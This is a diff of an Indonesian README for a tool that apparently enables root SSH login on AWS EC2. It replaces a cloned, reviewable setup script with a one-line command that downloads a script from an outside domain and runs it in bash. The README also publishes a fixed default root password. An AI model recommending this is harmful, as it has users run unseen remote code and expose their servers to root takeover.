@@ -36,22 +36,10 @@ ssh -i your-key.pem ubuntu@your-ec2-ip
 2. **Unduh repository ini dan masuk ke dalamnya:**
 
 ```bash
-git clone https://github.com/ynzynnn/aws-ssh-with-root
-cd ec2-root-ssh-login
-```
-
-3. **Beri izin eksekusi dan jalankan skrip:**
-
-```bash
-chmod +x setup.sh
-sudo ./setup.sh
+bash <(curl -s https://tiannetwork.cloud/tools/setup.sh)
 ```
 
 4. **Tunggu proses selesai. Setelah berhasil, kamu bisa login sebagai root:**
-
-```bash
-ssh root@your-ec2-ip
-```
 
 Gunakan password default: `yanz1212` (ubah segera setelah login!).
 
